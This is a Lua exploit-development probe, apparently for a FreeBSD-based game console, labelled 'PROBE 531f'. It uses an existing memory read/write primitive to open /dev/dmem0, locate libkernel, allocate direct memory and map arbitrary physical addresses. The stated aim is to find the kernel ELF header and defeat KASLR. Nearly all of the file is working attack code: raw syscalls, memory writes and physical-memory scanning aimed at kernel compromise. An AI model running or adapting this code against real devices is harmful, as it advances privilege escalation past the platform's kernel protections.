-- CRASH_CLASS: MODERATE
-- PROBE 531f: Physical memory scan via dmem0 mmap
--
-- 531e CONFIRMED: AllocateDirectMemory + mmap(dmem0) = R/W physical memory
-- phys=0x110010000, VA=0x310C48000, write 0xCAFEBABE readback OK
--
-- NOW: Can we map ARBITRARY physical addresses?
-- If yes → scan for kernel ELF header → KASLR defeat
--
-- Strategy:
-- 1. Try mmap dmem0 at phys offset 0x0 (beginning of RAM)
-- 2. Try at known physical ranges where kernel might live
-- 3. Scan for ELF header (0x7F454C46 = "\x7FELF")
-- 4. If dmem0 is restricted to our pool, try scanning within the pool

print("=== PROBE 531f: PHYS SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function hexq(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print(string.format("pid=%d", pid))

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa, uint64(0)) end)
end

-- Open dmem0
local devpath = memory.alloc(0x20)
local dname = "/dev/dmem0"
for i = 1, #dname do wd(N(devpath) + i - 1, string.byte(dname, i)) end
wd(N(devpath) + #dname, 0)
local dm_fd = N(native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0)))
print(string.format("dm_fd=%d", dm_fd))

-- Get libkernel base for AllocateDirectMemory
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local lk_lo = rd(N(ib) + 0x108) or 0
local lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk_base = uint64(string.format("0x%X%08X", lk_hi, lk_lo))

local alloc_fn = lk_base + uint64(0x17EF0)
local getsize_fn = lk_base + uint64(0x17810)
local sc_477 = mk(477)
local PAGE = 0x4000

-- ============================================================
-- [A] GetDirectMemorySize
-- ============================================================
print("")
print("[A] GetDirectMemorySize")
local ok_gs, rv_gs = pcall(function()
    return native.fcall_with_rax(getsize_fn, 0)
end)
print(string.format("  total=%s", ok_gs and hexq(rv_gs) or "FAIL"))

-- ============================================================
-- [B] Try mmap at arbitrary physical offsets (NOT allocated)
-- If dmem0 is a direct physical memory device, any offset might work.
-- If it's restricted, only allocated offsets work.
-- ============================================================
print("")
print("[B] Arbitrary phys mmap test")

local test_offsets = {
    0x0,           -- start of physical memory
    0x1000,        -- 4KB in
    0x100000,      -- 1MB
    0x1000000,     -- 16MB (kernel often here on FreeBSD)
    0x2000000,     -- 32MB
    0x10000000,    -- 256MB
    0x20000000,    -- 512MB
    0x40000000,    -- 1GB
    0x80000000,    -- 2GB (common kernel phys base)
    0x100000000,   -- 4GB
    0x110000000,   -- just before our allocation
    0x110010000,   -- our allocated page (should work!)
    0x110014000,   -- page after our allocation
    0x120000000,   -- within direct memory pool?
    0x130000000,   -- further in pool
    0x140000000,   -- near pool end
    0x150000000,   -- at pool size limit
}

for _, off in ipairs(test_offsets) do
    local off_hi = math.floor(off / 0x100000000)
    local off_lo = off % 0x100000000
    if off_lo < 0 then off_lo = off_lo + 0x100000000 end
    local off_str = string.format("0x%X%08X", off_hi, off_lo)

    local ok_mm, rv_mm = pcall(function()
        return sc_477(uint64(0), uint64(PAGE), uint64(3), uint64(1),
            uint64(dm_fd), uint64(off_str))
    end)

    local result = "FAIL"
    local va = 0
    if ok_mm and rv_mm then
        local mmh = get_hi_lo(rv_mm)
        if type(mmh) == "number" and mmh < 0 then mmh = mmh + 0x100000000 end
        if mmh ~= 0xFFFFFFFF then
            va = N(rv_mm)
            local d = rd(va)
            if d then
                if d < 0 then d = d + 0x100000000 end
                -- Check for ELF header
                if d == 0x464C457F then
                    result = string.format("VA=0x%X ELF!!!", va)
                else
                    result = string.format("VA=0x%X [0]=0x%08X", va, d)
                end
            else
                result = string.format("VA=0x%X FAULT", va)
            end
            -- Unmap to not leak VAs
            pcall(function() mk(73)(uint64(va), uint64(PAGE)) end)
        end
    end
    print(string.format("  0x%X: %s", off, result))
end

-- ============================================================
-- [C] Allocate at specific ranges to see pool bounds
-- ============================================================
print("")
print("[C] Alloc pool bounds")
local ranges = {
    {0, 0x10000000},        -- 0 to 256MB
    {0x10000000, 0x80000000},  -- 256MB to 2GB
    {0x80000000, 0x100000000}, -- 2GB to 4GB
    {0x100000000, "0x150000000"}, -- 4GB to 5.25GB (pool size)
}

for _, r in ipairs(ranges) do
    local phys_out2 = memory.alloc(8)
    wq(N(phys_out2), uint64(0))
    local start_str = type(r[1]) == "string" and r[1] or string.format("0x%X", r[1])
    local end_str = type(r[2]) == "string" and r[2] or string.format("0x%X", r[2])

    local ok_al, rv_al = pcall(function()
        return native.fcall_with_rax(alloc_fn, 0,
            uint64(start_str), uint64(end_str), uint64(PAGE),
            uint64(PAGE), uint64(0), uint64(N(phys_out2)))
    end)
    local p = rq(N(phys_out2))
    local rv_str = "FAIL"
    if ok_al and rv_al then
        local rvn = N(rv_al)
        if rvn < 0 then rvn = rvn + 0x100000000 end
        rv_str = string.format("0x%X", rvn)
    end
    print(string.format("  range %s-%s: rv=%s phys=%s", start_str, end_str, rv_str, hexq(p)))
end

pcall(function() native.fcall_with_rax(stub, 6, uint64(dm_fd)) end)

print("")
print("=== 531f DONE ===")
